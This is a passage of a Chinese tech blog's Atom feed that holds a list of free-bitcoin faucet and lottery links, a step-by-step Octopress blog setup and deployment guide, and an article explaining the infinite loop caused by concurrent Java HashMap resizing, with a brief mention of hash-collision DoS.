<li><a href="http://cur.lv/yk5h">DragonTale</a> 在线赌场，目前注册后会送一笔可以直接提出的比特币，每天获取一次比特币</li>
<li><a href="http://cur.lv/yk6t">bitcoinaddict</a> 填写收款地址，免费获取比特币</li>
<li><a href="http://cur.lv/yk61">dailybitcoins</a> 填写一个验证码，每天获取(随机)的一定数量的比特币，一天一次</li>
</ul>
<h2>博彩</h2>
<ul>
<li><a href="http://cur.lv/yskh"><a href="http://www.freebitcoinlottery.com/">http://www.freebitcoinlottery.com/</a></a> 猜6个号码，最高给100000uBTC</li>
<li><a href="http://cur.lv/ysj5">Free BitCoin Daily Scratchcard</a> 获得0.005或更多</li>
</ul>
]]></content>
    <category scheme="http://suetming.com/tags/free-bitcoin/" term="free bitcoin"/>
    <category scheme="http://suetming.com/categories/虚拟货币/" term="虚拟货币"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[octopress系列-从零搭建部署]]></title>
    <link href="http://suetming.com/2013/08/11/2013-05-06-blog-with-octopress-01/"/>
    <id>http://suetming.com/2013/08/11/2013-05-06-blog-with-octopress-01/</id>
    <published>2013-08-11T10:53:35.000Z</published>
    <updated>2013-08-11T10:53:35.000Z</updated>
    <content type="html"><![CDATA[<h2>引言</h2>
<p>本文主要介绍jekyll的博客引擎octopress如何配置、定制和增加评论分享插件，如何部署至github，以及如何注册绑定域名</p>
<p><a name="more"></a></p>
<h2>环境</h2>
<ul>
<li>git </li>
<li>ruby &gt;= 1.9.2</li>
<li>gem</li>
</ul>
<h2>安装octopress</h2>
<pre><code><figure class="highlight"><pre><span class="title">git</span> clone <span class="url">git://github.com/imathis/octopress.git</span> octopress
cd octopress
bundle install <span class="comment">#安装依赖</span>
rake install <span class="comment">#安装主题</span>
</pre></figure></code></pre>
<h2>主题theme</h2>
<p>google搜索主题定位github,输入如下代码切换主题</p>
<pre><code class="lang-sh"><figure class="highlight lang-sh"><pre><span class="title">cd</span> octopress
<span class="title">git</span> clone git://github.com/tommy351/<span class="type">Octopress</span>-<span class="type">Theme</span>-<span class="type">Slash</span>.git .themes/slash
<span class="title">rake</span> install['slash']
<span class="title">rake</span> generate
</pre></figure></code></pre>
<h2>发布到github</h2>
<pre><code><figure class="highlight"><pre><span class="title">rake</span> setup_github_pages <span class="comment">#建立连接按照提示输入url如：git@github.com:用户名/用户名.github.com.git</span>
rake generate <span class="comment">#生成静态页面</span>
rake preview <span class="comment">#本地预览 http://localhost:4000</span>
rake deploy <span class="comment">#部署到github，访问 http://用户名.github.com 查看博客服务器运行效果</span>
</pre></figure></code></pre>
<h2>添加评论</h2>
<p>默认的评论系统disqus主要针对twitter、facebook等不适合中国国情，选用时候国内的评论系统目前主要有友言、灯鹭、多说，<a href="http://www.zoum5.com/ue/310.html">对比文章见此处</a>
本文选用多说</p>
<ul>
<li>注册多说，绑定shortname</li>
<li>修改octopress，详细步骤见<a href="http://ihavanna.org/Internet/2013-02/add-duoshuo-commemt-system-into-octopress.html">此处</a></li>
</ul>
<h2>添加分享</h2>
<p>octopress自带的分享不适合中国国情，本文在查看了国内几个分享插件后，选用bshare</p>
<ul>
<li>注册bshare，定制分享控件样式，复制代码</li>
<li>修改_config.yml文件增加下述代码</li>
</ul>
<pre><code><figure class="highlight"><pre><span class="method">bshare_user:</span>
<span class="method">bshare_button:</span> <span class="keyword">true</span>
</pre></figure></code></pre>
<ul>
<li>将_config.yml中的twitter_tweet_button设置为false</li>
<li>修改source\includes\post\sharing.html文件，插入</li>
</ul>
<pre><code><figure class="highlight"><pre>

</pre></figure></code></pre>
<ul>
<li>将下述代码注释</li>
</ul>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">a</span> <span class="attribute">class</span>=<span class="value">"addthis_counter addthis_pill_style"</span>&gt;</span><span class="tag">&lt;/<span class="title">a</span>&gt;</span>
</pre></figure></code></pre>
<h2>SEO</h2>
<p>octopress 默认提供关键字和描述，默认new_post不生成，可以手动添加</p>
<pre><code><figure class="highlight"><pre><span class="comment">---</span>
<span class="title">layout</span>: post
<span class="title">title</span>: <span class="string">"Octopress SEO"</span>
<span class="title">date</span>: <span class="number">2013</span>-<span class="number">01</span>-<span class="number">23</span> <span class="number">22</span>:<span class="number">13</span>
<span class="title">comments</span>: true
<span class="title">categories</span>: <span class="type">Internet</span>
<span class="title">keywords</span>: octopress, seo, keywords, description
<span class="title">description</span>: octopress系列-从零搭建部署
<span class="comment">---</span>
</pre></figure></code></pre>
<p>或者编辑Rakefile，找到相应行插入</p>
<pre><code class="lang-sh"><figure class="highlight lang-sh"><pre>puts <span class="string">"Creating new post: #{filename}"</span>
  open(filename, <span class="string">'w'</span>) <span class="keyword">do</span> |post|
    post<span class="variable">.puts</span> <span class="string">"---"</span>
    post<span class="variable">.puts</span> <span class="string">"layout: post"</span>
    post<span class="variable">.puts</span> <span class="string">"title: \"#{title.gsub(/&amp;/,'&amp;')}\""</span>
    post<span class="variable">.puts</span> <span class="string">"date: #{Time.now.strftime('%Y-%m-%d %H:%M')}"</span>
    post<span class="variable">.puts</span> <span class="string">"comments: true"</span>
    post<span class="variable">.puts</span> <span class="string">"description: "</span>
    post<span class="variable">.puts</span> <span class="string">"categories: "</span>
    post<span class="variable">.puts</span> <span class="string">"keywords: "</span>
    post<span class="variable">.puts</span> <span class="string">"description: "</span>
    post<span class="variable">.puts</span> <span class="string">"---"</span>
</pre></figure></code></pre>
<p>编辑_config.yml，添加keywords和description，如下</p>
<pre><code><figure class="highlight"><pre><span class="attribute">keywords</span>: <span class="string">browser, internet, media, sql</span>
<span class="attribute">description</span>: <span class="string">Coding is my life。</span>
</pre></figure></code></pre>
<p>修改.themes/classic/source/_includes/head.html文件，替换description/keywords</p>
<pre><code><figure class="highlight"><pre><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"author"</span> <span class="attribute">content</span>=<span class="value">"<span class="variable">{{ site.author }}</span>"</span>&gt;</span>
<span class="template_tag">{% capture description %}</span>
    <span class="template_tag">{% <span class="keyword">if</span> page.description %}</span>
        <span class="variable">{{ page.description }}</span>
    <span class="template_tag">{% elsif site.description %}</span>
        <span class="variable">{{ site.description }}</span>
    <span class="template_tag">{%<span class="keyword">else</span>%}</span>
        <span class="variable">{{ content | raw_content }}</span>
    <span class="template_tag">{% <span class="keyword">endif</span> %}</span>
<span class="template_tag">{% endcapture %}</span>
<span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"description"</span> 
      <span class="attribute">content</span>=<span class="value">"<span class="variable">{{ description | strip_html | condense_spaces | truncate:150 }}</span>"</span>&gt;</span>
<span class="template_tag">{% <span class="keyword">if</span> page.keywords %}</span>
    <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"<span class="variable">{{ page.keywords }}</span>"</span>&gt;</span>
<span class="template_tag">{%<span class="keyword">else</span>%}</span>
    <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"<span class="variable">{{ site.keywords }}</span>"</span>&gt;</span>
<span class="template_tag">{% <span class="keyword">endif</span> %}</span>
</pre></figure></code></pre>
<h2>绑定域名</h2>
<ul>
<li>去域名提供商购买TLD域名(如<a href="www.namecheap.com">namecheap</a>)</li>
<li>在source文件下新建CNAME文件<pre><code><figure class="highlight"><pre>域名<span class="variable">.com</span>
</pre></figure></code></pre>
</li>
<li>上传至github<pre><code><figure class="highlight"><pre><span class="title">rake</span> deploy
</pre></figure></code></pre>
</li>
<li>域名提供商点击all host records</li>
</ul>
<p><img src="/images/photos/2013-03-27-namecheap-all-host-records.png" alt="all host records">
- 设置如图所示</p>
<p><img src="/images/photos/2013-03-27-namecheap-dns-settings.png" alt="namecheap dns settings"></p>
<h2>添加google统计分析</h2>
<ul>
<li>进入google统计分析页面增加网址www.yourdomainname.com</li>
<li>获取跟踪ID</li>
<li>将跟踪ID加入octopress的_config.yml中</li>
</ul>
<pre><code><figure class="highlight"><pre><span class="attribute">google_analytics_tracking_id</span>: <span class="string">xxxx</span>
</pre></figure></code></pre>
<h2>移动设备(ios|android)增加touch icon</h2>
<ul>
<li>制作APP图标保存为png(114 X 144)</li>
<li>在/source/_includes/head.html插入</li>
</ul>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">link</span> <span class="attribute">rel</span>=<span class="value">"apple-touch-icon"</span> <span class="attribute">href</span>=<span class="value">"apple-touch-icon-precomposed.png"</span>/&gt;</span>
</pre></figure></code></pre>
<ul>
<li>详细APP ICON 方法可参考
<a href="http://www.ravelrumba.com/blog/android-apple-touch-icon/">ravelrumba</a>
<a href="http://developer.apple.com/library/safari/#documentation/appleapplications/reference/safariwebcontent/ConfiguringWebApplications/ConfiguringWebApplications.html">developer.apple.com</a></li>
</ul>
<h2>可能的问题</h2>
<p>&#39;Liquid error: incompatible character encodings: UTF-8 and IBM437&#39;</p>
<ul>
<li>mygit: 添加两对用户自定义的环境变量，LC_ALL=en_US.UTF-8 和 LANG=en_US.UTF-8</li>
<li>cmd: 在octopress的Rakefile最后添加如下代码:</li>
</ul>
<pre><code><figure class="highlight"><pre>task :runwindows <span class="operator"><span class="keyword">do</span>
    puts <span class="string">'* Changing the codepage'</span>
    <span class="string">`chcp 65001`</span>
    puts <span class="string">'* Running Jekyll'</span>
    <span class="string">`jekyll --server --auto`</span>
<span class="keyword">end</span>
</pre></figure></code></pre>
<p>cmd下执行rake runwindows</p>
]]></content>
    <category scheme="http://suetming.com/tags/seo/" term="seo"/>
    <category scheme="http://suetming.com/categories/octopress/" term="octopress"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[HashMap.get()所导致的的死循环]]></title>
    <link href="http://suetming.com/2013/08/11/2013-05-14-hashmap-dot-get-cause-an-infinite-loop/"/>
    <id>http://suetming.com/2013/08/11/2013-05-14-hashmap-dot-get-cause-an-infinite-loop/</id>
    <published>2013-08-11T03:30:06.000Z</published>
    <updated>2013-08-11T03:30:06.000Z</updated>
    <content type="html"><![CDATA[<p>在以java为主导的web框架开发的APP，并发与多线程是经常出现的，若在高并发的API中用到了HashMap则可能诱发死循环</p>
<a name="more"></a>

<h2>症状</h2>
<ul>
<li>DDOS</li>
<li>CPU 100%</li>
<li>服务器访问速度异常缓慢</li>
</ul>
<h2>原因</h2>
<ul>
<li>HashMap并不是针对并发的根据Java Docs：</li>
</ul>
<blockquote>
<p><strong>Note that this implementation is not synchronized.</strong> If multiple threads access this map concurrently, and at least one of the threads modifies the map structurally, it must be synchronized externally. (A structural modification is any operation that adds or deletes one or more mappings; merely changing the value associated with a key that an instance already contains is not a structural modification.) This is typically accomplished by synchronizing on some object that naturally encapsulates the map.</p>
</blockquote>
<p>并发操作同一个HashMap就可能出现未知的诡异行为，而在调试中却又无法检测.</p>
<p>首先查看<strong>get()</strong>方法实现</p>
<figure class="highlight lang-java"><figcaption><span>old version </span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre>
<span class="keyword">public</span> Object get(Object key) {
	Object k = maskNull(key);
	<span class="keyword">int</span> hash = hash(k);
	<span class="keyword">int</span> i = indexFor(hash, table.length);
	Entry e = table[i];
	<span class="keyword">while</span> (<span class="keyword">true</span>) {
		<span class="keyword">if</span> (e == <span class="keyword">null</span>) <span class="keyword">return</span> e;
		<span class="keyword">if</span> (e.hash == hash &amp;&amp; eq(k, e.key)) <span class="keyword">return</span> e.value;
		e = e.next;
	}
}
</pre></td></tr></table></figure>



<figure class="highlight lang-java"><figcaption><span>new version </span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre>
<span class="keyword">public</span> V get(Object key) {
    <span class="keyword">if</span> (key == <span class="keyword">null</span>)
        <span class="keyword">return</span> getForNullKey();
    <span class="keyword">int</span> hash = hash(key.hashCode());
    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[indexFor(hash, table.length)];
         e != <span class="keyword">null</span>;
         e = e.next) {
        Object k;
        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))
            <span class="keyword">return</span> e.value;
    }
    <span class="keyword">return</span> <span class="keyword">null</span>;
}
</pre></td></tr></table></figure>



<p>注意<strong>while(true)</strong>和<strong>for</strong>的e.next指向e, 这里就是出现问题的地方分配e.next的为：</p>
<figure class="highlight lang-java"><figcaption><span>old version </span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre>
<span class="keyword">void</span> transfer(Entry[] newTable) {
	Entry[] src = table;
	<span class="keyword">int</span> newCapacity = newTable.length;
	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) {
		Entry e = src[j];
		<span class="keyword">if</span> (e != <span class="keyword">null</span>) {
			src[j] = <span class="keyword">null</span>;
			do {
				Entry next = e.next;
				<span class="keyword">int</span> i = indexFor(e.hash, newCapacity);
				e.next = newTable[i];
				newTable[i] = e;
				e = next;
			} <span class="keyword">while</span> (e != <span class="keyword">null</span>);
		}
	}
}

</pre></td></tr></table></figure>


<figure class="highlight lang-java"><figcaption><span>new version </span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre>
<span class="keyword">void</span> transfer(Entry[] newTable)
{
    Entry[] src = table;
    <span class="keyword">int</span> newCapacity = newTable.length;
    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) {
        Entry&lt;K,V&gt; e = src[j];
        <span class="keyword">if</span> (e != <span class="keyword">null</span>) {
            src[j] = <span class="keyword">null</span>;
            do {
                Entry&lt;K,V&gt; next = e.next;
                <span class="keyword">int</span> i = indexFor(e.hash, newCapacity);
                e.next = newTable[i];
                newTable[i] = e;
                e = next;
            } <span class="keyword">while</span> (e != <span class="keyword">null</span>);
        }
    }
}
</pre></td></tr></table></figure>


<h2>HashMap 原理</h2>
<p><img src="/images/photos/2013-05-14-hashmap.png" alt="HashMap 数据结构"></p>
<p>HashMap实现原理其实是一种“链表散列”的数据结构，通过hash算法将key散列，一个<key,value>存进来时，通过hash算出索引i，然后插入到指针数组table[i]中,如果不同的可以存入同一个table[i]中，则发生碰撞，即在table[i]处形成链表存储
如果table分配size为n，存入m个<key,value>，m 远远大于 n 则碰撞非常频繁，性能o(1)-&gt;o(n)，这是HashMap的不足，所以容量是HashMap的关键点，如果超过已知容量需要rehash，所有key的hash值会被重算</p>
<figure class="highlight lang-java"><figcaption><span>new version </span></figcaption><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="code"><pre>
<span class="keyword">public</span> V put(K key, V value) {
    <span class="comment">// HashMap允许存放null键和null值。</span>
    <span class="comment">// 当key为null时，调用putForNullKey方法，将value放置在数组第一个位置。</span>
    <span class="keyword">if</span> (key == <span class="keyword">null</span>)
        <span class="keyword">return</span> putForNullKey(value);
    <span class="comment">// 根据key的keyCode重新计算hash值。</span>
    <span class="keyword">int</span> hash = hash(key.hashCode());
    <span class="comment">// 搜索指定hash值在对应table中的索引。</span>
    <span class="keyword">int</span> i = indexFor(hash, table.length);
    <span class="comment">// 如果 i 索引处的 Entry 不为 null，通过循环不断遍历 e 元素的下一个元素。</span>
    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) {
        Object k;
        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(<span class="keyword">this</span>);
            <span class="keyword">return</span> oldValue;
        }
    }
    <span class="comment">// 如果i索引处的Entry为null，表明此处还没有Entry。</span>
    modCount++;
    <span class="comment">// 将key、value添加到i索引处。</span>
    addEntry(hash, key, value, i);
    <span class="keyword">return</span> <span class="keyword">null</span>;
}

<span class="keyword">void</span> addEntry(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">int</span> bucketIndex) {
    <span class="comment">// 获取指定 bucketIndex 索引处的 Entry </span>
    Entry&lt;K,V&gt; e = table[bucketIndex];
    <span class="comment">// 将新创建的 Entry 放入 bucketIndex 索引处，并让新的 Entry 指向原来的 Entry</span>
    table[bucketIndex] = <span class="keyword">new</span> Entry&lt;K,V&gt;(hash, key, value, e);
    <span class="comment">// 如果 Map 中的 key-value 对的数量超过了极限</span>
    <span class="keyword">if</span> (size++ &gt;= threshold)
    <span class="comment">// 把 table 对象的长度扩充到原来的2倍。</span>
        resize(<span class="number">2</span> * table.length);
}

<span class="keyword">void</span> resize(<span class="keyword">int</span> newCapacity) {
    Entry[] oldTable = table;
    <span class="keyword">int</span> oldCapacity = oldTable.length;
    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) {
        threshold = Integer.MAX_VALUE;
        <span class="keyword">return</span>;
    }

    Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity]; <span class="comment">// 新的容器空间</span>
    transfer(newTable); <span class="comment">// 复制数据过去</span>
    table = newTable;
    threshold = (<span class="keyword">int</span>)(newCapacity * loadFactor); <span class="comment">// 重新计算threshold的值</span>
}
</pre></td></tr></table></figure>


<p>根据代码可以发现resize是耗时最大的
单线程下的resize，假设初始容量为1，hash算法为取余 mod 1，resize后hash算法为 mod 2，则如图所示</p>
<p><img src="/images/photos/2013-05-14-hashmap-resize.png" alt="one thread hashmap resize"></p>
<p>并发下的resize
注意transfer()的<code>Entry&lt;K,V&gt; next = e.next;</code>，若thread 1 运行到这行挂起，thread 2 开始执行，如图所示</p>
<p><img src="/images/photos/2013-05-14-hashmap-resize-two-thread.png" alt="two thread hashmap resize">
thread 2 resize完成后，thread 1 开始执行，此时执行</p>
<pre><code><figure class="highlight"><pre><span class="setting">newTalbe[i] = <span class="value">e;</span></span>
<span class="setting">e = <span class="value">next // 导致 e 指向key(<span class="number">1</span>)</span></span>
</pre></figure></code></pre>
<p>下一次循环</p>
<pre><code><figure class="highlight"><pre><span class="keyword">next</span>=e.<span class="keyword">next</span> /<span class="regexp">/ 导致 e 指向key(3)
</pre></figure></code></pre>
<p>thread 1 继续key(1)放入newTable[i]的第一个，然后 e 和 next 移动，死循环出现key(3).next指向了key(1)</p>
<p>此时调用HashTable.get(5)时死循环出现，CPU100%</p>
<p>若支持多线程HashMap，需要采用ConcurrentHashmap</p>
<h2>深化</h2>
<p>根据Hash算法的“非随机性”原理可以制造出N多的value不一样，但是key一样数据，然后让你的Hash表成为一张单向链表，而导致你的整个网站或是程序的运行性能以级数下降（可以很轻松的让你的CPU升到100%）这个问题出现的语言：</p>
<ul>
<li>java 所有版本</li>
<li>jruby &lt;= 1.6.5</li>
<li>php &lt;= 5.3.8, &lt;= 5.4.0RC3</li>
<li>python 所有版本</li>
<li>ruby 所有版本</li>
<li>V8 JavaScript Engine 所有版本</li>
</ul>
<p>部分框架：
- tomcat &lt;= 5.5.34, &lt;= 6.0.34, &lt;= 7.0.22 （目前fix在 5.5.35,  6.0.35,  7.0.23）
- jetty 所有版本</p>
<p>详细文章参见<a href="http://coolshell.cn/articles/6424.html">CoolShell</a></p>
<h2>深入阅读</h2>
<ul>
<li><a href="http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003.pdf">基于HashMap的DOS</a></li>
<li><a href="http://coolshell.cn/articles/6424.html">CoolShell:Hash Collision DoS</a></li>
</ul>
]]></content>
    <category scheme="http://suetming.com/tags/DDOS/" term="DDOS"/>
    <category scheme="http://suetming.com/categories/java/" term="java"/>
  </entry>
</feed>
